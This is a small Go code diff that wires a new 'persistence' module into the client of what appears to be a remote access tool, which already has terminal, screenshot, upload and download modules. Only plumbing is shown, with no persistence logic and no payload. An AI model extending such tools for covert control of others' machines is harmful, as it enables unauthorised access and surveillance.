@@ -7,6 +7,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/download"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/information"
+	"github.com/tiagorlampert/CHAOS/client/app/usecase/persistence"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/screenshot"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/terminal"
 	"github.com/tiagorlampert/CHAOS/client/app/usecase/upload"
@@ -17,7 +18,7 @@ type App struct {
 	Handler handler.Handler
 }
 
-func NewApp(address, port string) *App {
+func NewApp(address, port, binaryPath string) *App {
 	// Connection
 	conn := network.NewConnection(address, port)
 
@@ -27,6 +28,7 @@ func NewApp(address, port string) *App {
 	downloadUseCase := download.NewDownloadUseCase(conn)
 	uploadUseCase := upload.NewUploadUseCase(conn)
 	terminalUseCase := terminal.NewTerminalUseCase(conn)
+	persistenceUseCase := persistence.NewPersistenceUseCase(conn, binaryPath)
 
 	useCase := usecase.UseCase{
 		Information: informationUseCase,
@@ -34,6 +36,7 @@ func NewApp(address, port string) *App {
 		Download:    downloadUseCase,
 		Upload:      uploadUseCase,
 		Terminal:    terminalUseCase,
+		Persistence: persistenceUseCase,
 	}
 
 	connectionHandler := connection.NewConnectionHandler(conn, &useCase)
